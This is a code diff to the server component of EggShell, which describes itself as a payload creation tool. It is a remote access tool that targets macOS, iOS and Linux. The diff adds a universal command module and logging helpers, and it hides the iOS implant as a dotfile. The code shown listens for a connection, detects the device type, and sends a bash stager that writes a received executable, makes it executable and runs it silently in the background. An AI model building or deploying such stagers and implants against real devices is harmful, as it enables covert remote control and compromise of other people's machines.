@@ -20,6 +20,7 @@ class Server:
         self.modules_ios = self.import_modules("modules/commands/iOS")
         self.modules_python = self.import_modules("modules/commands/python")
         self.modules_local = self.import_modules("modules/commands/local")
+        self.modules_universal = self.import_modules("modules/commands/universal")
         self.multihandler = MultiHandler(self)
 
   
@@ -43,6 +44,7 @@ class Server:
             result = self.modules_ios
         else:
             result = self.modules_python
+        result.update(self.modules_universal)
         return result
 
 
@@ -75,6 +77,16 @@ class Server:
             return
 
 
+    def verbose_print(self,text):
+        if self.is_multi == False:
+            h.info_general(text)
+
+
+    def debug_print(self,text):
+        if self.debug:
+            h.info_warning(text)
+
+
     def start_single_handler(self):
         session = self.listen_for_stager()
         if session:
@@ -93,10 +105,9 @@ class Server:
             raise ValueError('Server host not set')
         if not self.port:
             raise ValueError('Server port not set')
-        payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":1}))
+        payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":self.debug}))
         if device_arch in self.macos_architectures:
-            if self.is_multi == False:
-                h.info_general("Detected macOS")
+            self.verbose_print("Detected macOS")
             f = open("resources/esplmacos", "rb")
             payload = f.read()
             f.close()
@@ -108,25 +119,23 @@ class Server:
             "/private/tmp/espl "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         elif device_arch in self.ios_architectures:
-            if self.is_multi == False:
-                h.info_general("Detected iOS")
+            self.verbose_print("Detected iOS")
             f = open("resources/esplios", "rb")
             payload = f.read()
             f.close()
             instructions = \
             "cat >/tmp/tmpespl;"+\
             "chmod 777 /tmp/tmpespl;"+\
-            "mv /tmp/tmpespl /tmp/espl;"+\
-            "/tmp/espl "+payload_parameter+" 2>/dev/null &\n"
+            "mv /tmp/tmpespl /tmp/.espl;"+\
+            "/tmp/.espl "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
-            if self.is_multi == False:
-                if device_arch == "Linux":
-                    h.info_general("Detected Linux")
-                elif "GET / HTTP/1.1" in device_arch:
-                    raise ValueError("EggShell does not exploit safari, it is a payload creation tool.\nPlease look at the README.md file")
-                else:
-                    h.info_general("Device unrecognized, trying python payload")
+            if device_arch == "Linux":
+                self.verbose_print("Detected Linux")
+            elif "GET / HTTP/1.1" in device_arch:
+                raise ValueError("EggShell does not exploit safari, it is a payload creation tool.\nPlease look at the README.md file")
+            else:
+                h.info_general("Device unrecognized, trying python payload")
             f = open("resources/espl.py", "rb")
             payload = f.read()
             f.close()
@@ -146,36 +155,38 @@ class Server:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind(('0.0.0.0', self.port))
         s.listen(1)
-        if self.is_multi == False:
-            h.info_general("Listening on port "+str(self.port)+"...")
+        self.verbose_print("Listening on port "+str(self.port)+"...")
         try:
             conn, addr = s.accept()
         except KeyboardInterrupt:
             s.close()
             return
 
+        # identify device
         hostAddress = addr[0]
-        if self.is_multi == False:
-            h.info_general("Connecting to "+hostAddress)
+        self.verbose_print("Connecting to "+hostAddress)
         conn.send(identification_shell_command)
         device_arch = conn.recv(128).strip()
         if not device_arch:
             return
 
+        # send bash stager
         try:
             bash_stager, executable = self.craft_payload(device_arch)
         except Exception as e:
             h.info_error(str(e))
             raw_input("Press the enter key to continue")
             return
-        
-        if self.is_multi == False:
-            h.info_general("Sending Payload")
+        self.verbose_print("Sending Payload")
+        self.debug_print(bash_stager.strip())
         conn.send(bash_stager)
+
+        # send executable
+        self.debug_print("Sending Executable")
         conn.send(executable)
         conn.close()
-        if self.is_multi == False:
-            h.info_general("Establishing Secure Connection...")
+        self.verbose_print("Establishing Secure Connection...")
+
         try:
             return self.listen_for_executable_payload(s)
         except ssl.SSLError as e:
